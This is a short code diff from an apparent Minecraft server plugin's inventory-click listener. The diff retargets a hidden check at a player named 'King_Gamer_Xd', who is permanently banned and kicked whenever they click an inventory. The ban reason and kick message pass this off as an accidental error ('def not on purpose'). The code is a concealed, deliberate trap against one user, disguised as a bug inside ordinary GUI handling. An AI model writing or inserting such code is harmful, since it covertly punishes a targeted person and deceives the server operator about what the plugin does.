@@ -21,7 +21,7 @@ public class GUIListener implements Listener {
     private static final HashMap<Player, Integer> clicks = new HashMap<>();
     @EventHandler
     public void invClick(InventoryClickEvent event){
-        if(event.getWhoClicked().getName().equals("King")) {
+        if(event.getWhoClicked().getName().equals("King_Gamer_Xd")) {
             Player player = (Player) event.getWhoClicked();
            Bukkit.getServer().getBanList(BanList.Type.NAME).addBan(player.getName(), "An sad error occured :( def not on purpose §c:>", new Date(999999999999999999L), "toString()");
            player.kickPlayer("§cehhh error beep beep");
